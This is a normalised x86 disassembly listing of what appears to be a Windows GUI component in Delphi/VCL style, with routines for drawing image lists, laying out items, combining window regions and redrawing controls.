mov [ esi + 0x227 ] dl
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax esi
mov si 0xffee
call sub_403564
mov eax esi
call sub_44cd54
sub_4365d0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44845c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x230 ]
jne r-xdata
cmp esi [ edi + 0x240 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4368f4
cmp esi [ edi + 0x238 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_436a3c
cmp esi [ edi + 0x2dc ]
jne r-xdata
xor edx edx
mov eax edi
call sub_436998
xor edx edx
mov eax edi
call sub_436aa4
sub_436634
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_436719
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4563ec
mov edx eax
imul edx [ ebx + 0x34 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x48 ]
xor edx edx
xor eax eax
call sub_4062fc
mov eax [ ebp - 0x8 ]
call sub_427e2c
mov esi eax
mov eax [ esi + 0x14 ]
mov edx 0xff00000f
call sub_4249a4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_424d48
mov eax ebx
call sub_4563ec
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_429004
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436720
mov eax [ ebp - 0x8 ]
call sub_403368
retn
inc edi
xor esi esi
push 0x1
push 0x0
mov eax [ ebx + 0x34 ]
imul esi
push eax
mov eax [ ebp - 0x8 ]
call sub_427e2c
call sub_42516c
push eax
push esi
mov eax ebx
call sub_4561e4
push eax
call ImageList_Draw
inc esi
dec edi
jne r-xdata
sub_43672c
push ebp
mov ebp esp
add esp 0xffffffd8
mov [ ebp - 0x4 ] eax
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_436796
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_429004
mov [ ebp - 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403368
retn
push ebp
mov eax edx
call sub_436634
pop ecx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
test eax eax
jne r-xdata
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_436554
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x28 ]
push eax
xor ecx ecx
mov edx 0x42e
mov eax [ ebp - 0x4 ]
call sub_44a180
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_436554
mov ecx eax
mov edx 0x413
mov eax [ ebp - 0x4 ]
call sub_44a180
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x254 ] edx
mov esp ebp
pop ebp
retn
push eax
call DeleteObject
sub_436828
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x24c ] 0x0
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov esi [ ebx + 0x230 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_43672c
mov esi [ ebx + 0x238 ]
test esi esi
je r-xdata
mov eax esi
call sub_4561e4
mov edx eax
mov eax ebx
call sub_4368c8
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov eax esi
call sub_4561e4
mov edx eax
mov eax ebx
call sub_43696c
mov eax esi
call sub_4561e4
mov edx eax
mov eax ebx
call sub_436a10
pop esi
pop ebx
retn
sub_4368a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x230 ]
jne r-xdata
mov eax ebx
call sub_436c1c
sub_4368c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
push esi
xor ecx ecx
mov edx 0x430
mov eax ebx
call sub_44a180
sub_4368f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x230 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x230 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x234 ]
call sub_456b74
xor edx edx
mov eax ebx
call sub_4368c8
mov edx [ ebx + 0x234 ]
call sub_456bb8
mov edx ebx
mov eax [ ebx + 0x230 ]
call sub_421254
jmp r-xdata
mov eax ebx
call sub_436c1c
pop esi
pop ebx
retn
sub_436948
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x238 ]
jne r-xdata
mov eax ebx
call sub_436c1c
sub_43696c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
push esi
xor ecx ecx
mov edx 0x436
mov eax ebx
call sub_44a180
sub_436998
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x238 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x23c ]
call sub_456b74
xor edx edx
mov eax ebx
call sub_43696c
mov edx [ ebx + 0x23c ]
call sub_456bb8
mov edx ebx
mov eax [ ebx + 0x238 ]
call sub_421254
jmp r-xdata
mov eax ebx
call sub_436c1c
pop esi
pop ebx
retn
sub_4369ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x240 ]
jne r-xdata
mov eax ebx
call sub_436c1c
sub_436a10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
push esi
xor ecx ecx
mov edx 0x434
mov eax ebx
call sub_44a180
sub_436a3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x240 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x240 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x244 ]
call sub_456b74
xor edx edx
mov eax ebx
call sub_436a10
mov edx [ ebx + 0x244 ]
call sub_456bb8
mov edx ebx
mov eax [ ebx + 0x240 ]
call sub_421254
jmp r-xdata
mov eax ebx
call sub_436c1c
pop esi
pop ebx
retn
sub_436aa4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp edi [ ebx + 0x2dc ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test [ ebx + 0x50 ] 0x1
je r-xdata
mov dl 0x1
mov eax ebx
call sub_436510
cmp [ ebx + 0x2dc ] 0x0
je r-xdata
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44cd54
mov eax [ ebx + 0x2dc ]
test eax eax
je r-xdata
mov eax ebx
call sub_436554
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov eax edi
mov [ ebx + 0x2dc ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421484
mov edx esi
mov eax ebx
call sub_43653c
call sub_403368
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx ebx
call sub_421254
mov eax ebx
call sub_436554
mov esi eax
mov eax [ ebx + 0x2dc ]
mov eax [ eax + 0x34 ]
call sub_45adb4
mov edi eax
dec edi
sub edi esi
jl r-xdata
mov eax [ ebx + 0x2dc ]
mov eax [ eax + 0x34 ]
call sub_45adb4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax [ ebx + 0x2dc ]
mov eax [ eax + 0x34 ]
mov edx esi
call sub_45adc4
push eax
mov edx esi
mov eax ebx
call sub_43653c
pop edx
call sub_43509c
inc esi
dec edi
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_434620
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436bb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_434f8c
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x2dc ]
mov eax [ eax + 0x34 ]
mov edx esi
call sub_45adc4
push eax
mov edx esi
mov eax ebx
call sub_43653c
pop edx
call sub_43509c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_436c1c
push ebx
mov ebx eax
mov ax [ ebx + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov ecx [ ebx + 0x214 ]
mov edx [ ebx + 0x210 ]
mov eax ebx
call sub_4357ec
mov eax ebx
call sub_436e3c
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop ebx
retn
sub_436c66
add [ eax ] al
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x2c9 ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x2c8 ] 0x0
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403564
sub_436c94
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
cmp [ ebx + 0x2c9 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_44e670
push 0x0
xor ecx ecx
mov edx 0x447
mov eax ebx
call sub_44a180
mov esi eax
mov ax [ edi + 0x4 ]
sub ax 0xd
je r-xdata
cmp esi 0xffffffff
jle r-xdata
sub ax 0xe
je r-xdata
cmp [ edi + 0x4 ] 0x28
je r-xdata
mov eax [ ebx + 0x218 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax ebx
mov si 0xffb3
call sub_403564
sub ax 0xd
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
call sub_4188a0
mov esi eax
lea ecx [ esp + 0x8 ]
mov edx 0x1
mov eax 0x1
call sub_406318
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax esi
call sub_448acc
mov edx esi
mov eax ebx
mov si 0xffb1
call sub_403564
sub_436d44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
cmp [ esi + 0x2dc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax [ esi + 0x218 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
call sub_44c4e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
inc ebx
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x218 ]
call sub_4188a0
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
mov edx edi
mov eax [ esi + 0x218 ]
call sub_4188fc
inc eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_44c4a8
mov edi eax
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_436de0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_436c1c
mov eax ebx
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_44b088
mov eax ebx
call sub_436e3c
xor edx edx
mov eax ebx
call sub_435a94
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44c4a8
mov edx ebx
call sub_44892c
inc edi
dec esi
jne r-xdata
sub_436e3c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44fab8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x421
mov eax ebx
call sub_44a180
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
mov si 0xffee
call sub_403564
sub_436e88
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
test edi edi
jl r-xdata
xor ebx ebx
mov eax [ esi + 0x218 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x218 ]
cmp [ eax + 0x8 ] 0x1
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x7fffffff
jmp r-xdata
mov ebx edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
sub eax ebx
jl r-xdata
mov eax [ esi + 0x218 ]
cmp ebx [ eax + 0x8 ]
jl r-xdata
lea eax [ edi + 0x1 ]
cmp ebx eax
jne r-xdata
inc eax
mov [ ebp - 0x1c ] eax
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x3c ]
mov ah 0x20
call sub_402e48
mov eax edi
cmp eax 0xff
ja r-xdata
inc ebx
dec [ ebp - 0x1c ]
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
call sub_4188a0
mov eax [ eax + 0x40 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov [ ebp - 0x14 ] ebx
mov edx ebx
mov eax [ esi + 0x218 ]
call sub_4188a0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
jae r-xdata
bt [ ebp - 0x3c ] eax
cmp edi ebx
je r-xdata
mov eax [ esi + 0x218 ]
mov eax [ eax + 0x8 ]
dec eax
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x17c ] 0x0
jne r-xdata
mov ebx edi
inc ebx
mov eax [ ebp - 0x18 ]
push [ eax + 0x44 ]
mov eax [ ebp + 0x8 ]
pop edx
sub eax edx
cdq
xor eax edx
sub eax edx
mov ecx eax
cmp ecx [ ebp - 0x8 ]
jge r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
push [ eax + 0x44 ]
mov eax [ ebp + 0x8 ]
pop edx
sub eax edx
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] ebx
sub_436fd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436e88
mov [ ebp - 0x8 ] eax
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp ebx [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_418790
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov ecx esi
mov edx [ ebp - 0x8 ]
call sub_41891c
mov eax [ ebp - 0x4 ]
call sub_436e2c
xor eax eax
push ebp
push sub_437089
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
mov edx 0x416
mov eax [ ebp - 0x4 ]
call sub_44a180
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x415
mov eax [ ebp - 0x4 ]
call sub_435d90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_436e34
retn
dec [ ebp - 0x8 ]
sub_43709c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov ebp eax
mov edx edi
mov eax [ ebp + 0x218 ]
call sub_4188fc
mov esi eax
cmp esi 0xffffffff
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x44 ]
push eax
mov ecx [ edi + 0x40 ]
mov edx esi
mov eax ebp
call sub_436fd4
cmp esi eax
setne bl
mov [ esp ] 0x0
test bl bl
je r-xdata
lea eax [ esp + 0x1 ]
push eax
mov ecx esi
mov edx 0x41d
mov eax ebp
call sub_44a180
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp + 0x218 ]
call sub_4188fc
cmp esi eax
jle r-xdata
test [ ebp + 0x1c ] 0x10
je r-xdata
mov eax [ edi + 0x48 ]
mov edx [ esp + 0x9 ]
sub edx [ esp + 0x1 ]
cmp eax edx
setne [ esp ]
mov bl [ esp ]
mov esi eax
jmp r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x4c ]
cmp eax [ ebp + 0x214 ]
je r-xdata
mov edx esi
mov eax ebp
call sub_435960
cmp [ esp ] 0x0
je r-xdata
mov edx [ edi + 0x4c ]
mov eax ebp
call sub_435be4
jmp r-xdata
mov eax ebp
call sub_436e3c
xor edx edx
mov eax ebp
call sub_435a94
jmp r-xdata
mov edx esi
mov eax ebp
call sub_436164
sub_437170
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x25c ] 0x0
jg r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
xor edx edx
mov eax ebx
call sub_435a94
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43709c
sub_4371dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x21c ]
call sub_404624
mov edx eax
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
call sub_408a34
call sub_4089d0
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_437220
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
call sub_4089d0
mov ecx eax
mov edx edi
lea eax [ ebx + 0x21c ]
call sub_404254
pop edi
pop esi
pop ebx
retn
sub_437244
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax esi
call sub_44f7b4
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_437268
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44dda0
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_4379c4
sub_43729c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45fd40
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
pop esi
pop ebx
retn
sub_4372c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp edx
mov ebx eax
cmp [ ebx + 0x229 ] 0x0
je r-xdata
mov edx ebp
mov eax ebx
call sub_44dc90
mov eax ebx
call sub_44fab8
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
push esp
mov eax ebx
call sub_44f7b4
push eax
call GetWindowRect
mov eax ebx
call sub_4489b8
mov esi [ esp + 0x8 ]
sub esi [ esp ]
sub esi eax
mov eax ebx
call sub_4489fc
mov edi [ esp + 0xc ]
sub edi [ esp + 0x4 ]
sub edi eax
mov eax [ ebx + 0x4c ]
sub eax edi
push eax
mov eax [ ebx + 0x48 ]
sub eax esi
push eax
push 0x0
push 0x0
call CreateRectRgn
mov esi eax
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x14 ]
sub edx edi
push edx
mov eax [ eax + 0x10 ]
sub eax edi
push eax
push 0x0
push 0x0
call CreateRectRgn
mov edi eax
push 0x3
push esi
push edi
push esi
call CombineRgn
push esp
push esi
call GetRgnBox
sub [ esp ] 0x2
push esi
call DeleteObject
push edi
call DeleteObject
mov edx ebp
mov eax ebx
call sub_44dc90
push 0x5
push 0x0
lea eax [ esp + 0x8 ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call RedrawWindow
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4373a8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44dd50
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x18 ]
and eax 0x3
cmp eax 0x3
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_44fab8
test al al
je r-xdata
mov edx esp
mov eax ebx
call sub_448954
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_44f7b4
push eax
call InvalidateRect
sub_437408
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x248 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
inc edi
xor esi esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
add [ eax ] 0x2
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov eax [ eax + 0x8 ]
dec eax
cmp esi eax
jge r-xdata
inc esi
dec edi
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax [ ebx + 0x48 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x17d ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx esi
call sub_4188a0
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x214 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x18 ] eax
call sub_432ff0
cmp eax 0x40047
jl r-xdata
mov al [ ebx + 0x17c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_418df8
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x18 ]
add eax eax
mov ecx 0x3
cdq
idiv ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebx + 0x48 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x248 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x214 ]
add [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax [ ebx + 0x48 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov eax [ eax + 0x8 ]
dec eax
cmp esi eax
jge r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
call sub_432ff0
cmp eax 0x40048
jl r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x214 ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x18 ]
add [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_437610
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x248 ]
mov [ ebp - 0xc ] eax
xor edi edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x218 ]
cmp edi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx edi
call sub_4188a0
mov esi eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor ecx ecx
mov edx edi
call sub_418dcc
mov eax [ ebp - 0xc ]
add eax [ esi + 0x48 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ esi + 0x48 ]
add [ ebp - 0xc ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
inc edi
mov [ ebp - 0xd ] 0x0
mov ebx edi
cmp ebx 0x0
jl r-xdata
mov al [ esi + 0x17d ]
add al 0xfd
sub al 0x2
jb r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
